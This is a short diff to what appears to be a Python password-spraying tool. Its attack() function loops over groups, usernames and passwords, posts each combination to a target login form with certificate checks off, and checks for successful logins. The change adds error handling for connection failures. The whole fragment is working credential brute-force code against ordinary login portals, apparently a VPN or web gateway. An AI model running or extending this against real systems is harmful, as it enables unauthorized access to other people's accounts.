@@ -112,8 +112,11 @@ def attack(target, usernames, passwords, groups, rate):
 		for password in passwords:
 			for username in usernames:
 				data = f"tgroup=&next=&tgcookieset=&group_list={group}&username={username}&password={password}&Login=Login"
-				r = requests.post(url=target, cookies=cookies, data=data, verify=False)
-				validate_login(username, password, r)
+				try:
+					r = requests.post(url=target, cookies=cookies, data=data, verify=False)
+					validate_login(username, password, r)
+				except Exception:
+					print(f"{Fore.BLUE}> {Fore.RED}[-]{Fore.RED} Failed:{Style.RESET_ALL} {username}:{password}:Connection Error")
 				time.sleep(timeout)
 
 	return 0
